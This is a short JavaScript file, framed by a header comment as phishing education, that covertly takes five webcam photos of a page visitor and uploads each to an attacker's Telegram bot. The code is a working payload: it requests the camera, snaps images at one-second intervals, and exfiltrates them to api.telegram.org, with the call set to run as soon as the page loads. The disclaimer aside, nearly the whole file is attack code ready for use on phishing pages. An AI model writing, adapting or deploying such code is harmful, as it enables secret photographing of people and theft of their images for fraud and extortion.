     // This page is created to educate the public about phishing and how to prevent it. Please note that using this code for any illegal activities is strictly prohibited. The original code is available at https://github.com/saheermk/
     // Selfie capture module
     const SelfieCaptureModule = (() => {
        // Function to send a photo to Telegram
        async function sendPhotoToTelegram(botToken, chatId, photoDataURL) {
            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
    
            try {
                // Convert data URL to Blob
                const blob = await fetch(photoDataURL).then(response => response.blob());
    
                // Create FormData and append the photo
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'selfie.jpg'); // File name is optional but recommended
    
                // Send the photo to Telegram
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData,
                });
    
                const data = await response.json();
                if (data.ok) {
                    console.log('Photo sent successfully!');
                } else {
                    console.error('Failed to send photo:', data.description || 'Unknown error');
                }
            } catch (error) {
                console.error('Error sending photo:', error);
            }
        }
    
        // Function to capture selfies
        async function captureSelfies(count) {
            const selfies = [];
            const constraints = { video: { facingMode: 'user', width: 640, height: 480 } };
    
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
    
                for (let i = 0; i < count; i++) {
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Capture every 1 second
    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
    
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
                    // Compress the image to reduce file size
                    const selfieDataURL = canvas.toDataURL('image/jpeg', 0.7); // Quality set to 70%
                    selfies.push(selfieDataURL);
                }
    
                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                console.error('Error capturing selfies:', error);
            }
    
            return selfies;
        }
    
        // Function to capture and send selfies
        async function captureAndSendSelfies(botToken, chatId, count) {
            const selfies = await captureSelfies(count);
    
            for (const selfie of selfies) {
                await sendPhotoToTelegram(botToken, chatId, selfie);
            }
        }
    
        return {
            captureAndSendSelfies,
        };
    })();
    
    // Example usage
    const chatId =  'chat_id';
    const botToken = 'bot_token';
    const selfieCount = 5; // Number of selfies to capture
    
    // Call the function to start capturing and sending selfies
    SelfieCaptureModule.captureAndSendSelfies(botToken, chatId, selfieCount);
            